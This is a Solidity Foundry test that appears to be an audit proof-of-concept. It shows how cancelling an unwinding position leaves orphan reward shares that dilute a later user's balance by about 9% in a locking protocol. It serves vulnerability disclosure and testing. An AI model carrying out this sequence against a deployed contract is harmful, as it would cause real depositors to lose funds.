// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Fixture} from "@test/Fixture.t.sol";
import {CoreRoles} from "@libraries/CoreRoles.sol";
import {MockERC20} from "@test/mock/MockERC20.sol";
import {UnwindingModule} from "@locking/UnwindingModule.sol";
import {LockingTestBase} from "@test/unit/locking/LockingTestBase.t.sol";
import {LockingController} from "@locking/LockingController.sol";
import {console} from "@forge-std/console.sol";

contract OrphanSharesPoC is LockingTestBase {
    function testOrphanSharesDrainBob() public {
        // 1. Alice locks 1000 iUSD for 10 epochs
        _createPosition(alice, 1000e18, 10);

        // 2. Alice starts unwinding
        uint256 startUnwindingTimestampAlice = block.timestamp;
        vm.startPrank(alice);
        {
            address shareToken = lockingController.shareToken(10);
            MockERC20(shareToken).approve(address(gateway), 1000e18);
            gateway.startUnwinding(1000e18, 10);
        }
        vm.stopPrank();

        // 3. Advance epoch so Alice starts earning rewards
        advanceEpoch(1);

        // 4. Distribute 100 iUSD rewards
        _depositRewards(100e18);

        // Verify Alice's balance in UnwindingModule has increased to 1100 iUSD
        uint256 aliceBal = unwindingModule.balanceOf(alice, startUnwindingTimestampAlice);
        assertApproxEqAbs(aliceBal, 1100e18, 1e15, "Alice should have earned 100 iUSD in rewards");

        // 5. Alice cancels her unwinding. Her full 1100 iUSD is moved back to a new locked position.
        vm.startPrank(alice);
        {
            gateway.cancelUnwinding(startUnwindingTimestampAlice, 10);
        }
        vm.stopPrank();

        // Verify UnwindingModule state.
        // It has 0 receipt tokens now (1100e18 was sent back to LockingController), but totalShares is NOT 0!
        uint256 remainingShares = unwindingModule.totalShares();
        uint256 remainingReceiptTokens = unwindingModule.totalReceiptTokens();
        
        console.log("After Alice cancelUnwinding:");
        console.log("Remaining Shares in UnwindingModule:", remainingShares);
        console.log("Remaining ReceiptTokens in UnwindingModule:", remainingReceiptTokens);
        
        // remainingShares is 100e18 (the rewards shares that were left as orphans)!
        assertApproxEqAbs(remainingShares, 100e18, 1e15, "Orphan shares should be left in UnwindingModule");
        assertEq(remainingReceiptTokens, 0, "Receipt tokens in UnwindingModule should be 0");

        // 6. Bob locks 1000 iUSD for 10 epochs
        _createPosition(bob, 1000e18, 10);

        // 7. Bob starts unwinding
        uint256 startUnwindingTimestampBob = block.timestamp;
        vm.startPrank(bob);
        {
            address shareToken = lockingController.shareToken(10);
            MockERC20(shareToken).approve(address(gateway), 1000e18);
            gateway.startUnwinding(1000e18, 10);
        }
        vm.stopPrank();

        // Bob's balance in UnwindingModule immediately after starting unwinding
        uint256 bobBal = unwindingModule.balanceOf(bob, startUnwindingTimestampBob);
        console.log("Bob's initial balance in UnwindingModule:", bobBal);
        
        // Due to the orphan shares left by Alice, Bob's shares (1000) are diluted.
        // B's share ratio is: B_shares * totalReceiptTokens / totalShares
        // Total shares = Bob's shares (1000) + Alice's orphan shares (100) = 1100
        // Total receipt tokens = 1000
        // Bob's balance = 1000 * 1000 / 1100 = 909.09 iUSD!
        // Bob has immediately lost ~90.9 iUSD (9.09% of his principal)!
        assertLt(bobBal, 910e18, "Bob's balance should be heavily diluted");
    }
}
